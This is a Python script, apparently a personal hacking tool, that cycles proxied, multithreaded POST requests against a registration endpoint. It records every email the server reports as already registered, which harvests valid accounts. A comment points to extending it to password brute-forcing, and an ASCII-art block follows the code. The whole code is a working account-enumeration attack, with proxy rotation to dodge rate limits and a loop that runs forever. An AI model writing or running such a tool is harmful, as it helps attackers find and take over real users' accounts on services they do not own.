import requests
import json
import sys
import time
from concurrent.futures import ThreadPoolExecutor  
def send_custom_request(email,proxy):
    url = "your_url_here"

    
    headers = {
            #get the headers from burpsuite and manage it here
        }
    data = {
        "account": email,
        #put the pwd used in your RQ
        "pwd": "",
        "user_type": 1
    }
    proxy_dict = {
        #If you want to use proxies
        'http': proxy,
        'https': proxy
    }
    
    try:
        response = requests.post(url, headers=headers, json=data, proxies=proxy_dict, timeout=2)
        
        content_type = response.headers.get('Content-Type', '').lower()
        if 'application/json' in content_type:
            try:
                #need to clean the output from proxies exception tf
                #cleaned from proxies exceptions

                json_response = response.json()
                if 'status' in json_response:
                    status_code = json_response['status']
                    if status_code == 200:
                        print(f"Status code: {status_code} - Successful response for {email}")
                    elif json_response.get('msg') == "This account is already registered":
                        #if its already registred then thats a valid email 
                        #we can do the same for login + password bF with MD5
                        with open("accounts.txt", "a") as accounts_file:
                            accounts_file.write(email + "\n")
                            print(f"{email} is already registered. Added to accounts.txt")
                    else:
                        print(f"Status code: {status_code} - Error response for {email}: {json_response.get('msg', '')}")
                else:
                    print(f"No 'status' field found in the response for {email}")
            except json.decoder.JSONDecodeError:
                print(f"Failed to decode JSON content for {email}")
        else:
            print(f"Non-JSON response received for {email}")

    except requests.RequestException as e:
        #i think this one needs to be deleted 
        print(f"Request failed for {email} using proxy {proxy}.")

emails_filename = "generated_emails.txt"

with open(emails_filename, "r") as emails_file:
    emails = emails_file.read().splitlines()

proxies_filename = "working_proxies.txt"

with open(proxies_filename, "r") as proxies_file:
    proxies_list = proxies_file.read().splitlines()

# Pairing each email with a proxy -- honestly this line is a chatgpt optimization
email_proxy_pairs = [(email, proxy) for email, proxy in zip(emails, proxies_list)]

def execute_requests_with_proxy(email_proxy_pair):
    email, proxy = email_proxy_pair
    send_custom_request(email, proxy)

#number of threads used 
num_threads = 10  

# threading is cool
while True:
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        #optimization threading super vitesse lmao
        executor.map(execute_requests_with_proxy, email_proxy_pairs)





'''

#@@((@@@@(#@/@@@@@/@((@@@@&&@@@@#@@@@@@@@@@@@@@@@@@@&#///********,,,,,,,,,,,,,,,*****(%@@&@@&&&%%&%&&%#%#@@@#@&//@@@#@@@@@(/@@@@/(@%@@@@@(&@((@@@@(@#@@@(@@@@@
@%%%@@@@%@@&@@@@@@@%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@##%@@@@@@@@@@@@@@&(////*************,,,,,,,,,,,,,,,,,,,,*****/%@@@@@%&&&&@@@@@@#&@@@@@@###@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&%%@@@@@@@
@&%%@@@##&%%@&@@@@@(@@@@@(&@@@@@@@&&@@@@@@@%&@@@@&@*&@@@@@@@@@@@@#((////*************,,,,,,,,,,,,,,,,,,,,,,,********/&@@@&&&&#&@@@/#@/@@@@/&%@@@&/@@@@@@@&&@@@@@@@%%@@@@@@&%@@@@@@@@
@@@@@@@&&%(#&(#@@@@//#@@#(/@@@(//&%/@@@/**&@/@@@(/@&@@@@@@@@@@%(((/////*************,*,,,,,,,,,,,,,,,,,,,,,,,,,,*******#&@@@&@@@@&/(#/(@@@#//@@@///@@@/(//(&@@&//&@%@@@@(#@((@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&%&@@@@@@@@@@@@@@@@@@#(((/////****************,,,,,,,,,.,,,,,,,,,,,,,,,,,*****/*/&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&&@@@@@@@@@@@@@@@@@@
@@&@@@@#@@(@@(@@@@@@/@@@@((@@@%/#&&@@@@@@@@@/@@@&@@@@@@@@@@@&##(///////************,,,*,,,,,,,,,,,,,,,,,,,,,,,,,,********(&@@@@@@@(@@#@@@@@&%@@@//@@@@//@/@@@@@@@@@%@@@(@@@(%@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&##(///////*************,,,,,,,,,,,,,,,,,,,,,,,,,,,*******/**/#&&&@@@@@@@&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@#(%@@@&&@&@@/(@@@@/@@@@@/@@@@@*@@@*@@@@@@(*#@@@#&@@@@@@@@@@@&#((///////***********,,,,,,,,,,,,,,,,,,,,,,,,,,,,********///(#&&&@@@#@(&(@@@@&@@@@@#@@@@%&@@%&@@@@@@/(@@@@(@@#@@@@@@@@
@@@#@@@((&/(@@@@@@&%%%@@@%(@@@@(@@@@@@@@@@#*/@@@&@@@@@@@@@@@@&#((/////////******,***,*,,,,,,,,,,,,,,,,,,,,,,,**,,*****////#&&&&@@@&#@@@@@@%%*@@@(&@@@@#@@@@@@@@@@@//@@@@@#@@@@@@@@@@
@%&@@@@@%@@%@@@@@@@@&@@@@@&@@@@%&@@@@@@@@@%%#@@@%%@@@@@@@@@&&##(/////************,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,**///(#&&&&@@@@@@@@@@@%@@@@@&@@@@&@@@@@@@@@@@%%@@@@@@@@@@@@@@@@
@@(@@@@(@@##%/&@@@@&%@@@@/&@@@@@@@/@@@@@@@@@#@@@#(@@@@@@@@&##(((///##(*****,******,,,,,,*,,,,,,,,,,,,,,,,,,,,,,,,,,,,**////(%&@@*@#&@@&@@@@*@@@@%/&@@@@@@@%@@@@@@@@/@@@@#((@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&&&@@@@@@@@@@@@@(@@@@@@@@&####((&&@@@@@@@@&(*,,****,**,*/,,,,,*,**,,,,,,,,,,,,/%&%&&&%%/////(&&@@@@@@@@@@@@@@@@@@@@@@@&&@&@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@%@@@(@##@@@@/@@@@@@#@@@&(((*,&@@@@@**&@@@&@//(@@@@&####%&&##(//%%&&@@@@@##&(/****/**,,****,,,,**%@@&@@@@&&(/(#%&&&///(&&@&@@/(*#@@@@#@@@@@*@@@@*((/*%@@@@@@#(@@@@@/&/(@@@@@@@
@@@@@@@@@@#(@@@@@@@//@@@&#/@@@@@@@@@@@@@@@@@@@@@@@@@@&@@@%###%%#((////***%%%&&&@&@@%@#((***,***/((#&&@@@@@&%##/*****////////#&&@@@(#@@@@@@#(/@@@##*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@//&@@@@@@//@@@@/(@@@@@@@@@@@@@@@@@@@@@*/(@@%&&&%(####(((///******(%%%%%%&%&#//(*****#(((&%%&&%%##(/******/////////%&@@@@#*@@@@@@%/(@@@/((@@@@@@@@@@@@@@@@@@@@@#(@@@@@@@@@@
@#&@@@@@@@/&&@@@@@@//@@@(@@@@@@@@@@@@@@@@@&&*@@@&/@*&%&&&%(####(((##(/******##%%&&%&&&#/*,,,,,**%%%%%&&&##/*******/((///////%&&,@,/,/@@@@@%&%@@@%@@@@@@@@@@@@@@@@@&#@@@@(&@(&&#&@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@&&@@@@@@@@@@@@@@@@@@@@@@@@@@@%&&%(#####%##&@&&@%&*%,/#&&%(%#//**,,,,,***(#(*%%%/%#,#&%#&&@##((/////%&@@@@@@@@@@@@@@@@@@&&&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@(@@@/@@(@@/%@@@@/@@@@%**&@@@@@@@@@@@@@@@/*@@@@@@((&/&&#####((#&%%#(//****,****/(//****,,,,*********//*******//((#%&(**///%@@*@@&&@%*@@@&&@@@&/,(@@@@@@@@@@@@@@@(/@@@@@@@(##&@@@@@
@@@@@@@%(@#(@@@@@@@&@@@@@@@@@@@@@@@@@@@@@@/*/@@@@@@@@@@%&(##(//**/////****,,,,,**********,,,,*******,*,,,,,,,*////****,****/%*@///@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@((@@@@@@@@@@@@@@@@
@&&@@@@//@/#&/#@@@@%@@@@@@@@@@@@@@@@@@@@@@*%#@@@@@@@%%#&###(/*********,,,,,,,,,**********,,,,*******,**,,,,,,,,,,,,,,,,*****((/,,#@@@/&@@@@/@@@@@@@@@@@@@@@@@@@@@@/@@@@@@@@@@@@@@@@@
@@@@@@@////(@@@@@@@#%@@@@(*@@@@@@@@@@@@@@@@@@@@@*(@&&%#&(##(/********,,,,,,,,,*******/**,,,,,,,*********,,,,,,,,,,,,,,******/***&%#@@@@@@@%*%@@@*%@@@@@@@@@@@@@@@@@@@@@@%/@@@@#%@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&&%%###(///*******,,,,,,,,,,,,**/**,,,,,,,,,***/**,,,,,,,,,,,,,,,******//*/((#*&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&@@@@@
@@@(@@@//@/@@/*@@@@/@@@@@@*@@@@@@@@@@@@@@@&*&@@@,&&%&&&#####(///***********,**,,,,/*((////***********,,,,,,,,,,,,,,,******///##**/*(&*%@@@@*@@@@@(@@@@@@@@@@@@@@@@//@@@&/@@@@#/%@@@@
@@@@@@@@&&&&&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#@@@&//%%&&&%#####(///************,,,,(((##&%###(((&@(//*/*,,,,,,,,,,,,******////(%%/,*,/&&@@@@@&&@@@@@@@@@@@@@@@@@@@@@%@@@@%((&@@@@@@@@@
@&/&@@@@/&##&##&@@@*/@@@&*&@@@@@@@@@@@@@@@*%%**(,(%&&&&&###%###////*********,,,,(##%&@@@&&%%%&@@@##((,*,,,,,,,,*******//////(#%/**,//,*@@@#%*@@@%/@@@@@@@@@@@@@@@@/*@/(%(*&@@@%@@@@@
@(@%@@@#(%(&&@@@@@@@@@@@&/*@@@@@@@@@@@@@@@@@@@@@@@@%%&&&%##%%###////*******,,****#&&&&&&%%%%%&/*(#%#*,,,,,,,*********//////((&#(/*/&(@@@@@@@@@@@*/%@@@@@@@@@@@@@@@@@@@@@@@@@@@((@@@@
@@@@@@@@@@&@@@@@@@@@@@@@@&%@@@@@@@@@@@@@@@@@@@@@@@@%&%%&&##%%%%##(///**************/((%#(#&//*/(/*,,,,,,,,,,********//////((/***,,%%@@@@@@@@@@@@@%&@@@@@@@@@@@@@@@@@@@@@@@@@@@@&@@@@
@&&&@@@@@@//&*@@@@@/&@@@@@@@@@@@@@@@@@@@@@%@&,%%@@@%&%%%&###%%%%%#////*********##%#%%%##**((**/(#%/((/*****,******///////((#,,*,,/#(&&@@@@&@@@@@@@@@@@@@@@@@@@@@@@/%&/&@@@@@@@((@@@@
@@@@@@@@@@&&&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%##%%%%###////***//#(%%##////*,,,**,,,**/(((#%##(#******///////(((*,,,,,%%&&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@%@@@@@@@/&&&%&@@@@@@@@@#*@@@@@@@@@@@@@@@@@@@%@@@@@@&%%%%##%%%%####(////%(#&(////%%%%##############//(/%%##(***////////((/*,,,*&&&%&&,@@@@@@@@@*&@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@(&&@
@#&@@@@@@%**(((#@@&(#&@@@@&@@@@@@@@@@@@@@@//&(/(@@@@@@,,@@###%%%#####(//#(%((((#%%%%%##########(#####%%((/(%#(**///////(((@@%(,@%&,,//,%@@#(/@@@@@&@@@@@@@@@@@@@@@/*@((@@@@@@@((@@(@
@@#@@@@@@%//#**&@@&%%&@@@@@@@@@@@@@@@@@@@@&*@***@@@@@@(/@//###%%%%###(/((((#&@@@@#(**/*//*/*/*////((%%@&&%#((/(//////((((*@@&*(@&&*(,,%@@@%#%@@@@@@@@@@@@@@@@@@@@@(%@//@@@@@@@/&&#(@
@((/@@@@@@@@@@@@@@@@@@@@@#/@@@@@@*@@@@@@@@(#//&@@@@@@&.,#,#####%%%%%##(/////////////***,,,,*,,,,,***********//////(((((((&*@@@@%&&@@@@@@@@@@@@@@*@*@@@@@&&@@@@@@@@//@/@@@@@@@%#(#%&@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&@@@@@@@@@@@@@@@@@@@@&@@@@###%%%%%%%#//////////////////////***************///(((((((((#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&@@@@@@@@@@@@@@@@@@@@@@@@@@
@@(@@@@@@@/(&@@@@@@@@@@@@*@@@@@@@/&&@@@@@@@@@#@@@@@@@@@@@&&@@%%%#%%%%%%#(///////(/(((%&@&&&&@@&&%#(//*****////((((((((##@##/&(((@%/(@@@@@@@@@@@@&&@@@@@@@*&@@@@@@@@@@(@@@@@@@@@@@&&@
@&&@@@@@@@((%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%,((%@@@@@@@@@@@@@%##%%%%%%%%%((//((((((//((%@%@&@@%/(//((///////(((((((###/@@%%&@@@@@%*(@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&*##%@@@@@@@@@@@@@
@@#@@@@@@@##@@@@@@@@@@@@@@@@@@@@@@#@@@@@@@(/,#,&@@@@@@&&&@@@@&&&@/%%%%%%%%#(////////****,*,,,,,.,******///((#(((###(,&@@@***@@@@@@//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&(((%*@@@@@@@&&@#@@
@##(/&@@@@/(@@@@@@@@@@@@@@/@@@@@@&*/@@@@@@*&*@@@@@@@@%,,#,*@@@%%&@@&(%%%%%%%////************,,,,,,,*****/((######,&&%%@@@@&*@@@%(,%*@@@@@@@@@@@@@@*@@@@@@*/(@@@@@@(%@@@@@@@@@((/%&&@
@@@@&@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%@@@@@@@@@@@@@@@@@@@##%&@@@@%%%&@@@@&(%%%%##(////********************/(#####*%@&&%%#@@@@@@@@@@@&&&&@@@@@@@@@@@@@@@@@@@&%&@@@@@@@@@@@@@@@@@@&%%&@@@
@###(&@@@@%&&/(@@@@@@@@@@/(@@@@@@%*%@@@@@@@@@@%@@@@@@@@@@*(@(/%%%%&&&@@@@@/%%#%##(///////*/#///*//////((%##/(@@&&&%%%(,@@%*#&%*%%&%*&*&*@@@@@@@@(*@@@@@@&(*&@@@@@@@@@/@@@@@@@@@@&%(@
@@@%%%%@@@@@@##&@@@@@@@@&##%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@//@%%%%&&&&@@@@@@(%%#%%%%###%#(%(((%###(%###(#@@@@&%%%%%(,./@&@@@@@&%%@@@@@@@@@@@@@@#((&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@&(/%&@@@@&&/@@@@@@@@@@##@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#*,*&%%%%%&&&&&@@@@@@&(%%%%&&%%&&%%&%%%%%(/&@@@@&%%%%%%%*,..,&@&&@@@**/@&&%/@@@@@@@@@&*%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@(#%(((@@@@@@@@@@@@@@@@@#&/@@@@@@@@@*/%@@@@@@@@@%(*****#%%%%%%&&&&&%@@@@@@@@@@@@@@@@@@@@@@@@@@@&%%%%%%%%%*.....,%@&&&&#(%(*%//@@@@@@@@@@@@@@@@@@/(@@@@@@@@@@//@@@@@@@@@@@@@
@@@@@@@@@&%%&&&@@@@@@@@@@@@@@@@@@@&@@@@@@@@@@@@@@@@@@@@%#(******,*%%%%%%%%&&%%%%@@@@@@@@@@@@@@@@@@@@@&%%%%%%%%%#%, ......#&@&&&&&@@@@@&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@%(@@@@((&(&@@@@@@@@@@@@@@@@@@@#@@@@@@@@@@@@@@@@@@@###*********,*%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%##/.........,(#@&&&&&&&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@
@@@@@@@@@@&&&&&@@@@@&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#(#/*********,,, (%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%(....,,,,.....(#%@&&&&&&&&&@&&&&@&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@(%@@@@#(&&#&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#//(*********,,..   .(%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#/ .....,,,,.....,##@@&&&&&&&&&&@&&&&&&&&&@@@@@@%@@@@@@@@@@@@@@@@@@@@@@@%%@
@@@@@@@@@@&&&((@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/**(********,,,,,,.    .(%%%%%%%%%%%%%%%%%%%%%%%%%%#*  ......,,,,.....,(/(@&&&&&&&&&&&@@&&&&&&&&&&&&&&&&@@@@@@@@@@@@@@@@@@@@@&#@
@@@@@@@@@@#%%((%@@@@&%&@@@@@@@@@@@@@@@@@@@@@@@@@@@@#.  *********,,,,,,..      .#%%%%%%%%%%%%%%%%%##%%/.  ........,,,,.....*...&&&&&&&&&&&&&@@&&&&&&&&&&&&&&&&&&@@@@&@@@@@@@@@@@@@@%@
@@@@@@@@@@(&%@/%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*   .*,,,,,,,,,,,,,....        /%%%%%%%%%%%#((#*.   .......,,,,,,.....,....&&&&&&&&&&&&&&&@&&&&&&&&&&&&&&&&&&&&&&&&@@@@@@@@@@%(#@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/.    ,,,,,,,,,,,,,,.....         ,/#%%%%%#/...        .,,,,,,,,..,,*./... &&&&&&&&&&&&&&&&@&&&&&&&&&&&&&&&&&&&&&&&&&&&&&@@@@@@@@
@@(#&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#.  ...***,,,,,,,,,,,,..........    /%*..,(..  ... .. ..,,,,,,,,,,...,... .&&&&&&&&&&&&&&&&&@&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#/.    %*****,,,,,,,,,,,.  ...    @@@@@%(&@@@@.   . .....,,,,,,,.....,.    &&&&&&&&&&&&&&&&&&@&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@,.      ,..,///*,,,,,,,,,, ..  .@@@@@@@&//#@@@@@#   .....,,,,,.......      &&&&&&&&&&&&&&&&&&&@&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*.       ,...,********,,,,.. .@@@@@@@@@@&@@@@@@@@@(   .....,    ....       %&&&&&&&&&&&&&&&&&&&@&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/ .       ,.......,,,,,,,...%@@@@@@@@@@@&&@@@@@@@&///              .       &&&&&&&&&&&,,,,,,,,&&*,,,,,,,&&&,,,,*,,,&&&&&&&&&&&&&&
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&          ,..............///**@@@@@@@@@&@@@@@@@%/,.,,*           .       .&&&&&&&&&&@   &%   &&   *%   @@@   &&&&&&&&&&&&&&&&&&&
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.          ............/#*   .*/@@@@@@@@&@@@@@/,     ,,*                 #&&&&&&&&&&&        @@   *&&&&&&&   @&   &&&&&&&&&&&&&&
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/  .       ......... *(,        *&@@@@@@@@@@@/         .,*      .        @&&&&&&&&&&&   &&   &&   *@   &@@   @&   @&&&&&&&&&&&@&
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@           ......../,            @@@@@@@@@@,            .,*   .        (&&&&&&&&&&&&   &&   &@        @@@        &&&&&&&&@@&@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@,           .....*,             @@@@@@&@@@@@(              .,.         @@&&&&&&&&&&&&&&&&&&&&&&&&@@&&&&&&&@@@@@&&&@@&&&@&&@@@@@
'''
